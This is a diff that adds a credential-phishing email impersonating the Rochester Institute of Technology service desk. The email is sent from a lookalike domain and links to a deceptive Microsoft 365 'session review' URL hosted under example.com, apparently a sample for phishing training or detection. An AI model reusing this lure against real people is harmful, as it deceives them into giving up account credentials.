@@ -1,0 +1,21 @@
+From: RIT Service Desk <helpdesk@rit-accountservices.com>
+Subject: Microsoft 365 Sign-In Notice
+
+Hello,
+
+As part of this week's Microsoft 365 maintenance, some users may be asked
+to confirm their existing sign-in session.
+
+No action is required if you have already completed this process.
+
+If you have not, you can review your current session using the portal below:
+
+https://login.microsoftonline.com.verify-session.example.com/session
+
+The session review will remain available through Friday evening.
+
+Thank you,
+
+RIT Service Desk
+Information Technology Services
+Rochester Institute of Technology
